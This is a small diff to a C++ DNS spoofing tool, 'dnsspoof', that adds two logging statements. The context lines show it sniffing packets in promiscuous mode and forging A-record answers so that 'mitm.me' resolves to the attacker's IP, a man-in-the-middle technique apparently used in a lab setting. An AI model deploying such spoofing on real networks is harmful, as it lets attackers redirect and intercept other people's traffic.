@@ -23,6 +23,7 @@ bool callback(const PDU& pdu) {
             if (!(query.query_type() == DNS::A)) continue;
             // "A" record query, spoof response
             string hostname = query.dname();
+            cout << "DNS QUERY: " + hostname << endl;
             if(hostname == "mitm.me") {
                 dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
             }
@@ -48,6 +49,7 @@ int main(int argc, char* argv[]) {
         cout << "Usage: " <<* argv << " <interface>" << endl;
         return 1;
     }
+    cout << "Starting dnsspoof..." << endl;
     SnifferConfiguration config;
     config.set_promisc_mode(true);   // Sniff everything
     config.set_immediate_mode(true); // Use immediate mode so we get the packets as fast as we can
